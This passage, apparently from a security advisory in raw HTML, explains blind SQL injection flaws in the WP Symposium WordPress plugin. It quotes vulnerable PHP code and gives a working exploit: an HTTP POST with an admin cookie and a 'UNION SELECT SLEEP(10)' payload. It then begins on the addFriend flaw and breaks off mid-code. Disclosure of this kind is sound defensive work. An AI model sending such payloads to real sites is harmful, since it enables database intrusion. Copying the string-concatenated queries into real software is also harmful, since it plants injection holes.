class="crayon-sy">;</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span></div><div class="crayon-line" id="crayon-53c987717c94c588848511-1652"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">$topic_post</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-v">$_POST</span><span class="crayon-sy">[</span><span class="crayon-s">'topic_post'</span><span class="crayon-sy">]</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987717c94c588848511-1653">&nbsp;</div><div class="crayon-line" id="crayon-53c987717c94c588848511-1654"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-e">get_option</span><span class="crayon-sy">(</span><span class="crayon-s">'symposium_striptags'</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">==</span><span class="crayon-h"> </span><span class="crayon-s">'on'</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987717c94c588848511-1655"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">$topic_subject</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">strip_tags</span><span class="crayon-sy">(</span><span class="crayon-v">$topic_subject</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span></div><div class="crayon-line" id="crayon-53c987717c94c588848511-1656"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">$topic_post</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">strip_tags</span><span class="crayon-sy">(</span><span class="crayon-v">$topic_post</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987717c94c588848511-1657"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line" id="crayon-53c987717c94c588848511-1658">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-53c987717c94c588848511-1659"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">$topic_post</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">str_replace</span><span class="crayon-sy">(</span><span class="crayon-s">"\n"</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-e">chr</span><span class="crayon-sy">(</span><span class="crayon-cn">13</span><span class="crayon-sy">)</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">$topic_post</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span></div><div class="crayon-line" id="crayon-53c987717c94c588848511-1660"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">$topic_category</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-v">$_POST</span><span class="crayon-sy">[</span><span class="crayon-s">'topic_category'</span><span class="crayon-sy">]</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987717c94c588848511-1661">&nbsp;</div><div class="crayon-line" id="crayon-53c987717c94c588848511-1662"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-c">// Ensure safe HTML</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987717c94c588848511-1663"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">$topic_subject</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">str_replace</span><span class="crayon-sy">(</span><span class="crayon-s">"&lt;"</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-s">"&amp;lt;"</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">$topic_subject</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span></div><div class="crayon-line" id="crayon-53c987717c94c588848511-1664"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">$topic_subject</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">str_replace</span><span class="crayon-sy">(</span><span class="crayon-s">"&gt;"</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-s">"&amp;gt;"</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">$topic_subject</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987717c94c588848511-1665"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-e">get_option</span><span class="crayon-sy">(</span><span class="crayon-s">'symposium_use_wysiwyg'</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">!=</span><span class="crayon-h"> </span><span class="crayon-s">'on'</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-53c987717c94c588848511-1666"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">$topic_post</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">str_replace</span><span class="crayon-sy">(</span><span class="crayon-s">"&lt;"</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-s">"&amp;lt;"</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">$topic_post</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987717c94c588848511-1667"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">$topic_post</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">str_replace</span><span class="crayon-sy">(</span><span class="crayon-s">"&gt;"</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-s">"&amp;gt;"</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">$topic_post</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c987717c94c588848511-1668"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987717c94c588848511-1669">&nbsp;</div><div class="crayon-line" id="crayon-53c987717c94c588848511-1670"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-v">$topic_category</span><span class="crayon-h"> </span><span class="crayon-o">==</span><span class="crayon-h"> </span><span class="crayon-s">""</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987717c94c588848511-1671"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">$topic_category</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-v">$wpdb</span><span class="crayon-o">-&gt;</span><span class="crayon-e">get_var</span><span class="crayon-sy">(</span><span class="crayon-v">$wpdb</span><span class="crayon-o">-&gt;</span><span class="crayon-e">prepare</span><span class="crayon-sy">(</span><span class="crayon-s">"SELECT topic_category FROM "</span><span class="crayon-sy">.</span><span class="crayon-v">$wpdb</span><span class="crayon-o">-&gt;</span><span class="crayon-i">prefix</span><span class="crayon-sy">.</span><span class="crayon-s">'symposium_topics'</span><span class="crayon-sy">.</span><span class="crayon-s">" WHERE tid = "</span><span class="crayon-sy">.</span><span class="crayon-v">$tid</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c987717c94c588848511-1672"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987717c94c588848511-1673">&nbsp;</div><div class="crayon-line" id="crayon-53c987717c94c588848511-1674"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">$wpdb</span><span class="crayon-o">-&gt;</span><span class="crayon-e">query</span><span class="crayon-sy">(</span><span class="crayon-h"> </span><span class="crayon-v">$wpdb</span><span class="crayon-o">-&gt;</span><span class="crayon-e">prepare</span><span class="crayon-sy">(</span><span class="crayon-s">"UPDATE "</span><span class="crayon-sy">.</span><span class="crayon-v">$wpdb</span><span class="crayon-o">-&gt;</span><span class="crayon-i">prefix</span><span class="crayon-sy">.</span><span class="crayon-s">"symposium_topics SET topic_category = "</span><span class="crayon-sy">.</span><span class="crayon-v">$topic_category</span><span class="crayon-sy">.</span><span class="crayon-s">" WHERE topic_parent = "</span><span class="crayon-sy">.</span><span class="crayon-v">$tid</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987717c94c588848511-1675">&nbsp;</div><div class="crayon-line" id="crayon-53c987717c94c588848511-1676"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">$sql</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"UPDATE "</span><span class="crayon-sy">.</span><span class="crayon-v">$wpdb</span><span class="crayon-o">-&gt;</span><span class="crayon-i">prefix</span><span class="crayon-sy">.</span><span class="crayon-s">"symposium_topics SET topic_subject = %s, topic_post = %s, topic_category = %d WHERE tid = %d"</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987717c94c588848511-1677"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">$wpdb</span><span class="crayon-o">-&gt;</span><span class="crayon-e">query</span><span class="crayon-sy">(</span><span class="crayon-h"> </span><span class="crayon-v">$wpdb</span><span class="crayon-o">-&gt;</span><span class="crayon-e">prepare</span><span class="crayon-sy">(</span><span class="crayon-v">$sql</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">$topic_subject</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">$topic_post</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">$topic_category</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">$tid</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c987717c94c588848511-1678">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-53c987717c94c588848511-1679"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">$parent</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-v">$wpdb</span><span class="crayon-o">-&gt;</span><span class="crayon-e">get_var</span><span class="crayon-sy">(</span><span class="crayon-v">$wpdb</span><span class="crayon-o">-&gt;</span><span class="crayon-e">prepare</span><span class="crayon-sy">(</span><span class="crayon-s">"SELECT topic_parent FROM "</span><span class="crayon-sy">.</span><span class="crayon-v">$wpdb</span><span class="crayon-o">-&gt;</span><span class="crayon-i">prefix</span><span class="crayon-sy">.</span><span class="crayon-s">'symposium_topics'</span><span class="crayon-sy">.</span><span class="crayon-s">" WHERE tid = "</span><span class="crayon-sy">.</span><span class="crayon-v">$tid</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c987717c94c588848511-1680">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-53c987717c94c588848511-1681"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line" id="crayon-53c987717c94c588848511-1682">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-53c987717c94c588848511-1683"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-k ">exit</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c987717c94c588848511-1684"><span class="crayon-sy">}</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0168 seconds] -->
<p>We can exploit it like this with an appropriate set of cookies:</p><!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c987717c957088691806" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
POST /wordpress/wp-content/plugins/wp-symposium/ajax/symposium_forum_functions.php HTTP/1.0
Host: 192.168.80.130
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:13.0) Gecko/20100101 Firefox/13.0.1
Cookie: wordpress_logged_in_f3e14e7fde6969eb515c450fed50d259=admin%7C1347997111%7Cbe07b25720d1c846b47c3dee37e9801d; 
Content-Type: application/x-www-form-urlencoded
Content-Length: 53

action=updateEditDetails&amp;tid=1 UNION SELECT SLEEP(10)</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c987717c957088691806-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987717c957088691806-2">2</div><div class="crayon-num" data-line="crayon-53c987717c957088691806-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987717c957088691806-4">4</div><div class="crayon-num" data-line="crayon-53c987717c957088691806-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987717c957088691806-6">6</div><div class="crayon-num" data-line="crayon-53c987717c957088691806-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987717c957088691806-8">8</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c987717c957088691806-1"><span class="crayon-i">POST</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-i">wordpress</span><span class="crayon-o">/</span><span class="crayon-i">wp</span><span class="crayon-o">-</span><span class="crayon-i">content</span><span class="crayon-o">/</span><span class="crayon-i">plugins</span><span class="crayon-o">/</span><span class="crayon-i">wp</span><span class="crayon-o">-</span><span class="crayon-i">symposium</span><span class="crayon-o">/</span><span class="crayon-i">ajax</span><span class="crayon-o">/</span><span class="crayon-v">symposium_forum_functions</span><span class="crayon-sy">.</span><span class="crayon-e">php </span><span class="crayon-i">HTTP</span><span class="crayon-o">/</span><span class="crayon-cn">1.0</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987717c957088691806-2"><span class="crayon-i">Host</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-cn">192.168.80.130</span></div><div class="crayon-line" id="crayon-53c987717c957088691806-3"><span class="crayon-i">User</span><span class="crayon-o">-</span><span class="crayon-i">Agent</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-i">Mozilla</span><span class="crayon-o">/</span><span class="crayon-cn">5.0</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-e">Windows </span><span class="crayon-i">NT</span><span class="crayon-h"> </span><span class="crayon-cn">6.1</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-i">WOW64</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-i">rv</span><span class="crayon-o">:</span><span class="crayon-cn">13.0</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-i">Gecko</span><span class="crayon-o">/</span><span class="crayon-cn">20100101</span><span class="crayon-h"> </span><span class="crayon-i">Firefox</span><span class="crayon-o">/</span><span class="crayon-cn">13.0.1</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987717c957088691806-4"><span class="crayon-i">Cookie</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-v">wordpress_logged_in_f3e14e7fde6969eb515c450fed50d259</span><span class="crayon-o">=</span><span class="crayon-i">admin</span><span class="crayon-o">%</span><span class="crayon-cn">7C1347997111</span><span class="crayon-o">%</span><span class="crayon-cn">7Cbe07b25720d1c846b47c3dee37e9801d</span><span class="crayon-sy">;</span><span class="crayon-h"> </span></div><div class="crayon-line" id="crayon-53c987717c957088691806-5"><span class="crayon-i">Content</span><span class="crayon-o">-</span><span class="crayon-i">Type</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-i">application</span><span class="crayon-o">/</span><span class="crayon-i">x</span><span class="crayon-o">-</span><span class="crayon-i">www</span><span class="crayon-o">-</span><span class="crayon-i">form</span><span class="crayon-o">-</span><span class="crayon-e">urlencoded</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987717c957088691806-6"><span class="crayon-i">Content</span><span class="crayon-o">-</span><span class="crayon-i">Length</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-cn">53</span></div><div class="crayon-line" id="crayon-53c987717c957088691806-7">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-53c987717c957088691806-8"><span class="crayon-v">action</span><span class="crayon-o">=</span><span class="crayon-i">updateEditDetails</span><span class="crayon-o">&amp;</span><span class="crayon-v">tid</span><span class="crayon-o">=</span><span class="crayon-cn">1</span><span class="crayon-h"> </span><span class="crayon-e">UNION </span><span class="crayon-e">SELECT </span><span class="crayon-e">SLEEP</span><span class="crayon-sy">(</span><span class="crayon-cn">10</span><span class="crayon-sy">)</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0046 seconds] -->
<p><strong> Analysis of profile addFriend blind SQL injection vulnerability</strong></p>
<p>A similar lack of input validation can be seen in the /ajax/symposium_profile_functions.php file in the addFriend action handling code. It takes in an ID for a friend to add and then starts putting together some SQL like this:</p><!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c987717c960029536910" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div><span class="crayon-language">PHP</span></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
// Friend request made
if ($_POST['action'] == 'addFriend') {

	global $wpdb, $current_user;

	if (is_user_logged_in()) {

		$friend_from = $current_user-&gt;ID;
		$friend_to = $_POST['friend_to'];;					
		$friend_message = $_POST['friend_message'];

		// check that request isn't already there
		if ( $wpdb-&gt;get_var($wpdb-&gt;prepare("SELECT * FROM ".$wpdb-&gt;base_prefix."symposium_friends WHERE (friend_from = ".$friend_to." AND friend_to = ".$current_user-&gt;ID." OR friend_to = ".$friend_to." AND friend_from = ".$current_user-&gt;ID.")")) ) {
			// already exists
		} else {</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c987717c960029536910-1547">1547</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987717c960029536910-1548">1548</div><div class="crayon-num" data-line="crayon-53c987717c960029536910-1549">1549</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987717c960029536910-1550">1550</div><div class="crayon-num" data-line="crayon-53c987717c960029536910-1551">1551</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987717c960029536910-1552">1552</div><div class="crayon-num" data-line="crayon-53c987717c960029536910-1553">1553</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987717c960029536910-1554">1554</div><div class="crayon-num" data-line="crayon-53c987717c960029536910-1555">1555</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987717c960029536910-1556">1556</div><div class="crayon-num" data-line="crayon-53c987717c960029536910-1557">1557</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987717c960029536910-1558">1558</div><div class="crayon-num" data-line="crayon-53c987717c960029536910-1559">1559</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987717c960029536910-1560">1560</div><div class="crayon-num" data-line="crayon-53c987717c960029536910-1561">1561</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c987717c960029536910-1547"><span class="crayon-c">// Friend request made</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987717c960029536910-1548"><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-v">$_POST</span><span class="crayon-sy">[</span><span class="crayon-s">'action'</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-o">==</span><span class="crayon-h"> </span><span class="crayon-s">'addFriend'</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-53c987717c960029536910-1549">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-53c987717c960029536910-1550"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-m">global</span><span class="crayon-h"> </span><span class="crayon-v">$wpdb</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">$current_user</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c987717c960029536910-1551">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-53c987717c960029536910-1552"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-e">is_user_logged_in</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-53c987717c960029536910-1553">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-53c987717c960029536910-1554"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">$friend_from</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-v">$current_user</span><span class="crayon-o">-&gt;</span><span class="crayon-cn">ID</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c987717c960029536910-1555"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">$friend_to</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-v">$_POST</span><span class="crayon-sy">[</span><span class="crayon-s">'friend_to'</span><span class="crayon-sy">]</span><span class="crayon-sy">;</span><span class="crayon-sy">;</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987717c960029536910-1556"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">$friend_message</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-v">$_POST</span><span class="crayon-sy">[</span><span class="crayon-s">'friend_message'</span><span class="crayon-sy">]</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c987717c960029536910-1557">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-53c987717c960029536910-1558"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-c">// check that request isn't already there</span></div><div class="crayon-line" id="crayon-53c987717c960029536910-1559"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-h"> </span><span class="crayon-v">$wpdb</span><span class="crayon-o">-&gt;</span><span class="crayon-e">get_var</span><span class="crayon-sy">(</span><span class="crayon-v">$wpdb</span><span class="crayon-o">-&gt;</span><span class="crayon-e">prepare</span><span class="crayon-sy">(</span><span class="crayon-s">"SELECT * FROM "</span><span class="crayon-sy">.</span><span class="crayon-v">$wpdb</span><span class="crayon-o">-&gt;</span><span class="crayon-i">base_prefix</span><span class="crayon-sy">.</span><span class="crayon-s">"symposium_friends WHERE (friend_from = "</span><span class="crayon-sy">.</span><span class="crayon-v">$friend_to</span><span class="crayon-sy">.</span><span class="crayon-s">" AND friend_to = "</span><span class="crayon-sy">.</span><span class="crayon-v">$current_user</span><span class="crayon-o">-&gt;</span><span class="crayon-cn">ID</span><span class="crayon-sy">.</span><span class="crayon-s">" OR friend_to = "</span><span class="crayon-sy">.</span><span class="crayon-v">$friend_to</span><span class="crayon-sy">.</span><span class="crayon-s">" AND friend_from = "</span><span class="crayon-sy">.</span><span class="crayon-v">$current_user</span><span class="crayon-o">-&gt;</span><span class="crayon-cn">ID</span><span class="crayon-sy">.</span><span class="crayon-s">")"</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987717c960029536910-1560"><span 